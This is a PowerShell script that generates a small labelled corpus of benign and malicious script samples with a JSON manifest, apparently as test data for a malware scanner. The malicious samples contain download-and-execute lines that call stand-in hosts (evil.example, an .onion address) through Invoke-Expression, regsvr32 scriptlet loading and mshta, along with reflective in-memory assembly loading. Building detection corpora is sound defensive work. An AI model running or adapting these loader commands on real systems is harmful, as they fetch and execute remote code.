param(
  [string]$WorkspaceRoot = ".",
  [string]$OutputRoot = "./tmp-phase3-corpora"
)

$ErrorActionPreference = "Stop"

function Resolve-AbsolutePath {
  param(
    [Parameter(Mandatory = $true)]
    [string]$InputPath
  )

  $candidate = $InputPath
  if (-not [System.IO.Path]::IsPathRooted($candidate)) {
    $candidate = Join-Path $script:WorkspaceRootAbsolute $candidate
  }

  return [System.IO.Path]::GetFullPath($candidate)
}

function Write-Utf8File {
  param(
    [Parameter(Mandatory = $true)]
    [string]$Path,
    [Parameter(Mandatory = $true)]
    [string]$Content
  )

  $parent = Split-Path -Parent $Path
  if (-not [string]::IsNullOrWhiteSpace($parent)) {
    New-Item -ItemType Directory -Force -Path $parent | Out-Null
  }

  [System.IO.File]::WriteAllText($Path, $Content, [System.Text.UTF8Encoding]::new($false))
}

$workspaceCandidate = $WorkspaceRoot
if (-not [System.IO.Path]::IsPathRooted($workspaceCandidate)) {
  $workspaceCandidate = Join-Path (Get-Location) $workspaceCandidate
}
$script:WorkspaceRootAbsolute = [System.IO.Path]::GetFullPath($workspaceCandidate)
$outputRootAbsolute = Resolve-AbsolutePath -InputPath $OutputRoot

$maliciousRoot = Join-Path $outputRootAbsolute "malicious"
$benignRoot = Join-Path $outputRootAbsolute "benign"
New-Item -ItemType Directory -Force -Path $maliciousRoot, $benignRoot | Out-Null

$samples = [System.Collections.Generic.List[object]]::new()

$samples.Add([PSCustomObject]@{
    RelativePath = "benign\powershell-admin-report.ps1"
    Class = "benign"
    Content = @'
$report = Get-ChildItem $HOME\Documents -Filter *.txt | Select-Object -First 5
$report | ForEach-Object { Write-Output $_.FullName }
'@
  }) | Out-Null

$samples.Add([PSCustomObject]@{
    RelativePath = "benign\powershell-build-health.ps1"
    Class = "benign"
    Content = @'
$logs = Get-ChildItem $HOME\source -Filter *.log -Recurse -ErrorAction SilentlyContinue | Select-Object -First 10
$logs | Measure-Object | Write-Output
'@
  }) | Out-Null

$samples.Add([PSCustomObject]@{
    RelativePath = "benign\wscript-inventory.js"
    Class = "benign"
    Content = @'
var fso = new ActiveXObject("Scripting.FileSystemObject");
WScript.Echo("Inventory root: " + fso.GetAbsolutePathName("."));
'@
  }) | Out-Null

$stagedLoaderContent = @(
  '$wc = New-Object Net.WebClient'
  '$payload = [System.Convert]::FromBase64String("QUJDREVGR0g=")'
  '[System.Reflection.Assembly]::Load($payload) | Out-Null'
  ('Invoke-' + 'Expression ($wc.' + 'DownloadString("https://evil.example:8443/bootstrap.ps1"))')
  ('reg' + 'svr32 /s /n /u /i:https://example.onion/file.sct scrobj.dll')
) -join [Environment]::NewLine

$samples.Add([PSCustomObject]@{
    RelativePath = "malicious\powershell-staged-loader.ps1"
    Class = "malicious"
    Content = $stagedLoaderContent
  }) | Out-Null

$samples.Add([PSCustomObject]@{
    RelativePath = "malicious\powershell-memory-loader.ps1"
    Class = "malicious"
    Content = @'
[System.Reflection.Assembly]::Load($payload) | Out-Null
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([IntPtr]::Zero, [Type]) | Out-Null
'@
  }) | Out-Null

$samples.Add([PSCustomObject]@{
    RelativePath = "malicious\wscript-proxy-chain.js"
    Class = "malicious"
    Content = @'
var shell = new ActiveXObject("WScript.Shell");
shell.Run("mshta https://evil.example/payload.hta", 0, false);
'@
  }) | Out-Null

$manifest = [System.Collections.Generic.List[object]]::new()
foreach ($sample in $samples) {
  $samplePath = Join-Path $outputRootAbsolute $sample.RelativePath
  Write-Utf8File -Path $samplePath -Content $sample.Content.TrimStart()

  $manifest.Add([PSCustomObject]@{
      relativePath = $sample.RelativePath.Replace('\', '/')
      class = $sample.Class
      sizeBytes = (Get-Item -LiteralPath $samplePath).Length
    }) | Out-Null
}

$manifestPath = Join-Path $outputRootAbsolute "phase3-corpus-manifest.json"
$manifestReport = [PSCustomObject]@{
  generatedAtUtc = [DateTime]::UtcNow.ToString("o")
  outputRoot = $outputRootAbsolute
  samples = $manifest
}
$manifestReport | ConvertTo-Json -Depth 6 | Set-Content -Path $manifestPath -Encoding UTF8

Write-Host "OUTPUT_ROOT=$outputRootAbsolute"
Write-Host "MANIFEST_PATH=$manifestPath"
Write-Host "SAMPLE_COUNT=$($manifest.Count)"
